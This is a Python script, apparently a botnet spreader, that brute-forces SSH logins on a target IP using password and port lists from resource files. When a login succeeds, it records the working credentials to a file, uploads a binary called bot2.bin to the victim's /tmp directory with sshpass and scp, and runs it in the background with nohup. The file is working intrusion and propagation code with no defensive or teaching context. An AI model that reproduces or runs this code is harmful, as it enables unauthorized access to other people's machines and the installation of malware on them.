#!/usr/bin/python3
import os.path
import sys
from Class.Looper import Looper
from Class.Shell import shell
from Class.Tools import Utils
from Class.Colors import Colors

"""
Files containing params
"""
USER_PASS = Looper("./resources/passwords.txt", True).loop()
# IPS = Looper(sys.argv[1]).loop()
IP = sys.argv[1]
PROTOCOLS = Looper("./resources/protocols.txt", True).loop()
HERE = shell().execom("pwd")["subprocess"][0].rstrip()
FILE = "./resources/bot2.bin"
BINF = os.path.join(HERE, FILE)
DEF_DEST = "/tmp/"
DEBUG = True
OS = ""

duck = """
                  __
              ___( o)>
              \ <_. )
               `---'  
"""


def scan(ip):
    """
    scan ip with protocols and user pass
    :param ip:
    :return:
    """
    for protocol in PROTOCOLS:
        for u_p in USER_PASS:
            # Utils().dbg("attempt ssh connection")
            if "ssh" in protocol[1]:
                if not Utils().test_ssh(ip, u_p, protocol):
                    # Utils().dbg("{} ==> cant connect on ssh".format(ip))
                    print("nope for {} {}:{}".format(ip, u_p[0], u_p[1]))
                else:
                    # Utils().dbg("attempting rsync copy to target")
                    print("{} {} {} {} success with {}:{}".format(Colors.OKGREEN, duck, Colors.END, ip, u_p[0], u_p[1]))
                    shell().execom('echo "{} {}:{}" >> availables_at_`date+ %d-%m-%Y`.txt'.format(ip, u_p[0], u_p[1]))
                    sync(FILE, u_p[0], u_p[1], protocol[0], BINF, ip, DEF_DEST)

            if "telnet" in protocol[1]:
                """
                telnet connection not used for now
                """
                if not Utils().test_telnet(ip, u_p[0], u_p[1]):
                    break


def sync(file, usr, pwd, port, source, ip, dst):
    """
    upload file @ target
    :param file:
    :param usr:
    :param pwd:
    :param port:
    :param source:
    :param ip:
    :param dst:
    :return:
    """
    # Utils().dbg("syncing")
    # first command , copy the file @target
    copy = 'sshpass -p {} scp -P {} {} {}@{}:{}'.format(pwd.rstrip(), port.rstrip(), "./{}".format(file.rstrip()),
                                                        usr.rstrip(),
                                                        ip.rstrip(), dst)
    # print(copy)
    _exec = shell().execom(copy)
    # Utils().dbg(_exec)
    if _exec["retcode"] == 0:
        print("{} succesfully uploaded @{}:{}".format(source, ip, dst))
        # execute command to install the bin @dst
        rexec = 'sshpass -p {} ssh {}@{} -p {} "$(nohup /tmp/./{} > /dev/null 2>&1 &) && sleep 1 && exit"'.format(
            pwd.rstrip(), usr.rstrip(),
            ip.rstrip(), port.rstrip(),
            file, file)
        # print(rexec)
        if shell().execom(rexec)["retcode"] == 0:
            print("{} sucessfully executed @{}".format(file.rstrip(), ip.rstrip()))
        else:
            print("failed to execute {} @{}".format(file.rstrip(), ip.rstrip()))

    else:
        print("failed to load {} @ {}:{}".format(file, ip, {dst}))


def main():
    """
    main loop launched
    :return:
    """
    Utils().dbg("{}start scanning {}{}".format(Colors.WARNING, sys.argv[1], Colors.END))
    # for ip in IPS:
    scan(IP)


main()
# delete generated ips
exit(0)
